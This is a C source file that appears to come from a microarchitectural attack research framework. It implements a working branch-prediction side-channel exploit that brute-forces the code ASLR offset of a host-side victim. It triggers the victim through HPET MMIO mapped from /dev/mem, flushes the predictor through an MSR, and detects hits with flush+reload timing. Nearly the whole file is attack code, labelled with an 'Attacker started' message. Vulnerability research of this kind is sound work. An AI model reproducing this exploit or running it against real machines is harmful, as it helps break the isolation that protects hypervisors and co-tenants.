// #define DISABLE_MMIO
// #define SELF_STANDING
// #define DEBUG_HITS

// WARNING: Always check that all macros are correct!
#define HVA_SRC   0x555555e8bea1
#define HVA_DST   0x555555c41040
#define MMIO_BASE 0xfed00000 // hpet

#define RETRIES       8
#define PAGE_4K       (4096UL)
#define PAGE_2M       (512 * PAGE_4K)
#define PAGE_1G       (512 * PAGE_2M)
#define TARGET_OFFSET (64)
#define DOT_STEPS     32

#define CACHE_MISS_THRES 300
#define SECRET           3
#define RB_OFFSET        0xac0
#define RB_SLOTS         4

#ifdef MARCH_ZEN5
#define BIG_OFFSET_MAX   (1UL << 32)
#define COLLISION_SPLITS 16
#define GROUPING      (1 << 6)
#else
#define BIG_OFFSET_MAX   (1UL << 45)
#define COLLISION_SPLITS 1
#define GROUPING      (1 << 10)
#endif

#include "compiler.h"
#include "jita.h"
#include "kmod/pi.h"
#include "lib.h"
#include "log.h"
#include "mem.h"
#include "psnip.h"
#include "rb_tools_2mb.h"
#include "stub.h"
#include <err.h>
#include <fcntl.h>
#include <linux/memfd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

// for debugging we can set this to the actual address of the call
// #define ORACLE_ASSIST 0x630322631ea1

extern char psnip_aslr_src_call_label[];
extern char psnip_aslr_entry_label[];
// clang-format off
uarf_psnip_declare_define(psnip_aslr_src,
    #ifdef MARCH_ZEN4
    "psnip_aslr_entry_label:\n\t"
    #endif
    "step3:\n\t"                // 0x555555e8be20
    ".fill 0x4b, 0x1, 0x90\n\t"
    "test %ebx,%ebx\n\t"
    "je step2\n\t"              // 0x555555e8be6d
    ".fill 0x21, 0x1, 0x90\n\t"

    "step1: \n\t"               // 0x555555e8be90
    ".fill 0x0d, 0x1, 0x90\n\t"
    "add $"STR(TARGET_OFFSET)", %rax\n\t"
    "psnip_aslr_src_call_label:\n\t"
    "call *-"STR(TARGET_OFFSET)"(%rax)\n\t"      // 0x555555e8bea1 (Size: 2)
    ".fill 0x2c, 0x1, 0x90\n\t"

    "step2:\n\t"                // 0x555555e8bed0
    "test %ebx,%ebx\n\t"
    "je step1\n\t"              // 0x555555e8bed2
    #ifdef MARCH_ZEN5
    ".fill 0x7eac, 0x1, 0x90\n\t"

    "psnip_aslr_entry_label:\n\t"// <--- entrypoint of this snippet
    ".fill 0x4c, 0x1, 0x90\n\t" // 0x555555e93d80
    "test %ebx,%ebx\n\t"
    "je step5\n\t"              // 0x555555e93dce
    ".fill 0x3, 0x1, 0x90\n\t"

    "step4:\n\t"                // 0x555555e93dd7
    ".fill 0x7d, 0x1, 0x90\n\t"
    "lea step3(%rip), %rcx\n\t"
    "call *%rcx\n\t"            // 0x555555e93e5b
    ".fill 0x43, 0x1, 0x90\n\t"

    "step5:\n\t"                // 0x555555e93ea0
    ".fill 0x4c, 0x1, 0x90\n\t"
    "jmp step4\n\t"             // 0x555555e93eec
    #endif
);
// clang-format on

// clang-format off
#ifdef MARCH_ZEN5
uarf_psnip_declare_define(psnip_aslr_victim_dst,
    // remove the stack entries
    "add %rdx, %rsp\n\t"
    "add %rdx, %rsp\n\t"
    "ret\n\t"
);
#else
uarf_psnip_declare_define(psnip_aslr_victim_dst,
    // remove the stack entries
    "add %rdx, %rsp\n\t"
    "ret\n\t"
);
#endif
// clang-format on

// clang-format off
uarf_psnip_declare_define(psnip_aslr_train_dst,
    "mov (%r12), %r8\n\t"
    "int3\n\t"
);
// clang-format on

// clang-format off
uarf_psnip_declare_define(psnip_aslr_check_dst,
    "add $"STR(RB_OFFSET)", %r12\n\t"
    "mov (%r12), %r8\n\t"
    "int3\n\t"
);
// clang-format on

#ifdef MMAP_FLAGS
#undef MMAP_FLAGS
#endif
#define MMAP_FLAGS  (MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED_NOREPLACE)
#define PROT_RW     (PROT_READ | PROT_WRITE)
#define PROT_RWX    (PROT_RW | PROT_EXEC)
#define PG_ROUND(n) (((((n) - 1UL) >> 12) + 1) << 12)

// make it work on older systems
#ifndef MFD_EXEC
#define MFD_EXEC MFD_CLOEXEC
#endif

uint64_t targets[(GROUPING + 2) * (TARGET_OFFSET / sizeof(uint64_t))];

uint8_t break_code_aslr(uint64_t *);

#ifdef SELF_STANDING
int main(void) {
    UARF_LOG_INFO("Attacker started\n");

    rb_init();
#else
uint8_t break_code_aslr(uint64_t *offset_ptr) {
#endif

    uarf_pi_init();

#ifndef DISABLE_MMIO
    // prepare mmio
    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd == -1) {
        UARF_LOG_ERROR("Failed to open /dev/mem\n");
        return 0;
    }
    volatile uint64_t *mmio =
        mmap(_ptr(0x13000000UL), 8, PROT_READ | PROT_WRITE, MAP_SHARED, fd, MMIO_BASE);
    if (mmio == MAP_FAILED) {
        UARF_LOG_ERROR("Failed to map MMIO\n");
        return 0;
    }
#endif

    // allocate a hugepage to store the src and dst candidates
    int mem_fd;
    if ((mem_fd = syscall(SYS_memfd_create, "test",
                          MFD_EXEC | MFD_HUGETLB | MFD_HUGE_1GB)) < 0)
        err(1, "memfd_create");

    if (ftruncate(mem_fd, 2 * PAGE_1G) == -1) {
        err(EXIT_FAILURE, "ftruncate");
    }

    // offset of the victim call from the start of the src snippet
    uint64_t call_offset = ((uint64_t) psnip_aslr_src_call_label) - psnip_aslr_src.addr;
    uint64_t entry_offset = ((uint64_t) psnip_aslr_entry_label) - psnip_aslr_src.addr;
    // signed distance between the src and the rocker target
    int64_t target_offset = HVA_DST - HVA_SRC;
    // "harmless" jump target, stored globally for speed so we don't flush the stack (not
    // sure this actually helps)
    uint64_t victim_dst = 0x300000000000ul;
    uint64_t reload_ptr = RB_PTR + RB_OFFSET + SECRET * RB_STRIDE;

#ifdef MARCH_ZEN4
    // fill the allocated 1GB page with all possible src and dst gadget locations
    uint64_t base_addr = 0x400000000000ul;
    int flags = MAP_SHARED | MAP_FIXED_NOREPLACE;
    void *res = mmap(_ptr(base_addr), PAGE_1G, PROT_READ | PROT_WRITE | PROT_EXEC, flags,
                     mem_fd, 0);
    if (res == _ptr(~(0ul))) {
        err(1, "mmap 1G page 0-0");
    }
    res = mmap(_ptr(base_addr + PAGE_1G), PAGE_1G, PROT_READ | PROT_WRITE | PROT_EXEC,
               flags, mem_fd, 0);
    if (res == _ptr(~(0ul))) {
        err(1, "mmap 1G page 0-1");
    }
    // can be used in debugging to ensure no overlaps
    // memset(_ptr(base_addr), 0, PAGE_1G);
    for (uint64_t offset = 0; offset < PAGE_1G; offset += PAGE_4K) {
        uint64_t src_addr = base_addr + PAGE_1G + offset + (HVA_SRC & 0xFFF);
        uint64_t src_snip_start = src_addr - call_offset;
        uint64_t dst_snip_start = src_addr + target_offset;
        // can be used in debugging to ensure no overlaps
        // for (uint64_t i = 0; i < (psnip_aslr_src.end_addr - psnip_aslr_src.addr); ++i)
        // {
        //     if (*(uint8_t *) (src_snip_start + i) != 0) {
        //         err(1, "overlap src!");
        //     }
        // }
        memcpy(_ptr(src_snip_start), psnip_aslr_src.ptr,
               (psnip_aslr_src.end_addr - psnip_aslr_src.addr));
        // can be used in debugging to ensure no overlaps
        // for (uint64_t i = 0; i < psnip_aslr_train_dst.end_addr -
        // psnip_aslr_train_dst.addr; ++i)
        // {
        //     if (*(uint8_t *) (dst_snip_start + i) != 0) {
        //         err(1, "overlap dst!");
        //     }
        // }
        memcpy(_ptr(dst_snip_start), psnip_aslr_train_dst.ptr,
               (psnip_aslr_train_dst.end_addr - psnip_aslr_train_dst.addr));
    }
    if (munmap(_ptr(base_addr), PAGE_1G))
        err(1, "munmap");
    if (munmap(_ptr(base_addr + PAGE_1G), PAGE_1G))
        err(1, "munmap");
#endif

    // prepare the victim non-signaling target
    UarfStub stub_victim_dst = uarf_stub_init();
    UarfJitaCtxt jita_victim_dst = uarf_jita_init();
    uarf_jita_push_psnip(&jita_victim_dst, &psnip_aslr_victim_dst);
    uarf_jita_allocate(&jita_victim_dst, &stub_victim_dst, victim_dst);

#ifdef ORACLE_ASSIST
    uint64_t oracle = ORACLE_ASSIST;
#endif

    uint64_t map_at;
    uint8_t first_round = 1;
#ifdef ORACLE_ASSIST
    // start closer to the real offset for debugging
    for (uint64_t big_offset =
             (oracle & ~(0x3FFFFFFFUL)) - (HVA_SRC & ~(0x3FFFFFFFUL)) - (200 * PAGE_1G);
         big_offset < 0x400000000000; big_offset += PAGE_1G) {
#else
    // iterate over all possible 1GB ASLR offsets
    // printf("searching victim branch");
    for (uint64_t big_offset = 0; big_offset < BIG_OFFSET_MAX; big_offset += PAGE_1G) {
#endif
        // map the code page at the location of the current guess
        map_at = (HVA_SRC & ~(0x3FFFFFFFUL)) + big_offset;
        if (big_offset % (PAGE_1G * 32 * DOT_STEPS) == 0) {
            printf("\nsearch at 0x%012lx: ", map_at);
            fflush(stdout);
        }
        if ((big_offset / PAGE_1G) % DOT_STEPS == DOT_STEPS - 1) {
            printf(".");
            fflush(stdout);
        }
        void *res = mmap(_ptr(map_at + PAGE_1G), PAGE_1G,
                         PROT_READ | PROT_WRITE | PROT_EXEC | MAP_HUGETLB | MFD_HUGE_1GB,
                         MAP_SHARED | MAP_FIXED_NOREPLACE, mem_fd, 0);
        if (res == MAP_FAILED) {
            printf("\naddr 0x%012lx\n", map_at);
            err(1, "mmap 1G page 1");
        }
        if (first_round) {
            res = mmap(_ptr(map_at - PAGE_1G), PAGE_1G,
                       PROT_READ | PROT_WRITE | PROT_EXEC | MAP_HUGETLB | MFD_HUGE_1GB,
                       MAP_SHARED | MAP_FIXED_NOREPLACE, mem_fd, 0);
            if (res == MAP_FAILED) {
                printf("\naddr 0x%012lx\n", map_at - PAGE_1G);
                err(1, "mmap 1G page 2");
            }
            res = mmap(_ptr(map_at), PAGE_1G,
                       PROT_READ | PROT_WRITE | PROT_EXEC | MAP_HUGETLB | MFD_HUGE_1GB,
                       MAP_SHARED | MAP_FIXED_NOREPLACE, mem_fd, 0);
            if (res == MAP_FAILED) {
                printf("\naddr 0x%012lx\n", map_at - PAGE_1G);
                err(1, "mmap 1G page 3");
            }
            first_round = 0;
        }
        // touch the pages to make sure they are in the TLB
        *(volatile uint8_t *) (map_at + PAGE_1G);
        *(volatile uint8_t *) map_at;
        *(volatile uint8_t *) (map_at - PAGE_1G);

        // iterate over all possible ASLR page offsets within the grouping
        for (uint64_t offset = 0; offset < PAGE_1G;
             offset += PAGE_4K * GROUPING * COLLISION_SPLITS) {
            rb_reset();
            for (int split = 0; split < COLLISION_SPLITS; split += 1) {
                // build targets and  measure a set of branches all in one go for
                // SPEEED
                for (int g = 0; g < GROUPING; ++g) {
                    uint64_t src_guess = map_at + offset +
                                         (COLLISION_SPLITS * g + split) * PAGE_4K +
                                         (HVA_SRC & 0xFFF);
                    uint64_t src_guess_start = src_guess - call_offset;
                    uint64_t src_guess_entry = src_guess_start + entry_offset;
                    uint64_t index = g * (TARGET_OFFSET / sizeof(targets[0]));
                    targets[index] = src_guess_entry;

#ifdef MARCH_ZEN5
                    memcpy(_ptr(src_guess_start), psnip_aslr_src.ptr,
                           (psnip_aslr_src.end_addr - psnip_aslr_src.addr));
                    uint64_t dst_snip_start = src_guess + target_offset;
                    memcpy(_ptr(dst_snip_start), psnip_aslr_train_dst.ptr,
                           (psnip_aslr_train_dst.end_addr - psnip_aslr_train_dst.addr));
#endif
                }
                targets[GROUPING * (TARGET_OFFSET / sizeof(targets[0]))] = victim_dst;

                // we need to clear the branch predictor (collisions would engage the ITA)
                uarf_pi_wrmsr(MSR_PRED_CMD, 1 << MSR_PRED_CMD__IBPB);

#ifndef DISABLE_MMIO
                // trigger MMIO to train the victim branch
                mmio[0] = 0;
#endif

                // measure for a set of branches all in one go for SPEEED
                for (int g = 0; g < GROUPING + 1; ++g) {
                    uint64_t index = g * (TARGET_OFFSET / sizeof(targets[0]));
                    asm("clflushopt (%0)\n" ::"r"(&targets[index]));
                }
                rb_flush();
                register uint64_t reload_ptr_reg asm("r12") = reload_ptr;
                // clang-format off
                asm volatile("group_test:\n\t"
                    "add $"STR(TARGET_OFFSET)", %%rax\n\t"
                    "call *-"STR(TARGET_OFFSET)"(%%rax)\n\t"
                    :
                    : "a"(targets), "b"(0), "d"(GROUPING * 8), "r"(reload_ptr_reg)
                    : "rcx", "r8");
                // clang-format on
                rb_reload();

                // check if one of the branches caused a hit
                size_t maxi = rb_max_index(rb_hist, RB_SLOTS - 1);
                if (maxi == SECRET && rb_hist[maxi] > 0) {
#ifdef DEBUG_HITS
                    printf("\nrb: %s, [%lu]: %lu\n", gen_rb_heat(), maxi, rb_hist[maxi]);
#endif

#ifdef MARCH_ZEN5
                    // cleanup all gadgets to reduce false positives
                    memset(_ptr(map_at - PAGE_1G), 0, 3 * PAGE_1G);
#endif
                    // we now have to try to find the actual hit in the grouping
                    for (int g = 0; g < GROUPING; ++g) {
                        uint64_t retry_reload_ptr = RB_PTR + SECRET * RB_STRIDE;
                        rb_reset();
                        for (int i = 0; i < RETRIES; ++i) {
                            // we need to clear the branch predictor (collisions would
                            // engage the ITA)
                            uarf_pi_wrmsr(MSR_PRED_CMD, 1 << MSR_PRED_CMD__IBPB);

                            // trigger MMIO to train the victim branch
#ifndef DISABLE_MMIO
                            mmio[0] = 0;
#endif

                            uint64_t src_guess =
                                map_at + (COLLISION_SPLITS * g + split) * PAGE_4K +
                                offset + (HVA_SRC & 0xFFF);
                            uint64_t src_guess_start = src_guess - call_offset;
                            uint64_t src_guess_entry = src_guess_start + entry_offset;
                            memset(targets, 0, sizeof(targets));
                            targets[0 * (TARGET_OFFSET / sizeof(targets[0]))] =
                                src_guess_entry;
                            targets[1 * (TARGET_OFFSET / sizeof(targets[0]))] =
                                victim_dst;

                            // change the hypothetical target to reduce false positives?
                            uint64_t hypothetical_target = src_guess + target_offset;
#ifdef MARCH_ZEN5
                            memcpy(_ptr(src_guess_start), psnip_aslr_src.ptr,
                                   (psnip_aslr_src.end_addr - psnip_aslr_src.addr));
#endif
                            memcpy(_ptr(hypothetical_target), psnip_aslr_check_dst.ptr,
                                   (psnip_aslr_check_dst.end_addr -
                                    psnip_aslr_check_dst.addr));

                            rb_flush();
                            register uint64_t reload_ptr_reg asm("r12") =
                                retry_reload_ptr;
                            // clang-format off
                            asm volatile(""
                                //"victim_dispatch_label:\n\t"
                                "add $"STR(TARGET_OFFSET)", %%rax\n"
                                "clflush (%%rax)\n\t" // TODO might be needed for reliability
                                "call *-"STR(TARGET_OFFSET)"(%%rax)\n\t"
                                :
                                : "a"(targets), "b"(0), "d"(8), "r"(reload_ptr_reg)
                                : "rcx", "r8");
                            // clang-format on
                            rb_reload();
                            size_t maxi = rb_max_index(rb_hist, RB_SLOTS - 1);
                            if (maxi == SECRET && rb_hist[maxi] > RETRIES / 2) {
#ifdef DEBUG_HITS
                                printf("rb: %s, [%lu]: %lu\n", gen_rb_heat(), maxi,
                                       rb_hist[maxi]);
                                printf("found at: 0x%012lx\n", src_guess);
                                printf("offset: 0x%012lx\n", src_guess - HVA_SRC);
#else
                                printf("\n");
#endif

                                if (munmap(_ptr(map_at - PAGE_1G), PAGE_1G))
                                    err(1, "munmap");
                                if (munmap(_ptr(map_at), PAGE_1G))
                                    err(1, "munmap");
                                if (munmap(_ptr(map_at + PAGE_1G), PAGE_1G))
                                    err(1, "munmap");
                                uarf_jita_deallocate(&jita_victim_dst, &stub_victim_dst);
                                close(mem_fd);
#ifndef SELF_STANDING
                                if (offset_ptr)
                                    *offset_ptr = src_guess - HVA_SRC;
#endif
                                return 1;
                            }

#ifdef MARCH_ZEN5
                            // remove the gadgets again
                            memset(_ptr(src_guess_start), 0,
                                   (psnip_aslr_src.end_addr - psnip_aslr_src.addr));
                            memset(_ptr(hypothetical_target), 0,
                                   (psnip_aslr_check_dst.end_addr -
                                    psnip_aslr_check_dst.addr));
#else
                            // put back the gadget since we might need it still
                            memcpy(_ptr(hypothetical_target), psnip_aslr_train_dst.ptr,
                                   (psnip_aslr_train_dst.end_addr -
                                    psnip_aslr_train_dst.addr));
#endif
                        }
                    }
                }
            }
        }
        if (munmap(_ptr(map_at - PAGE_1G), PAGE_1G))
            err(1, "munmap");

#ifdef ORACLE_ASSIST
        if (map_at + PAGE_1G > oracle) {
            if (munmap(_ptr(map_at), PAGE_1G))
                err(1, "munmap");
            printf("ohno...!\n");
            return 0;
        }
#endif
    }

    // finish cleanup
    if (munmap(_ptr(map_at), PAGE_1G))
        err(1, "munmap");
    if (munmap(_ptr(map_at + PAGE_1G), PAGE_1G))
        err(1, "munmap");
    uarf_jita_deallocate(&jita_victim_dst, &stub_victim_dst);
    close(mem_fd);
    return 0;
}
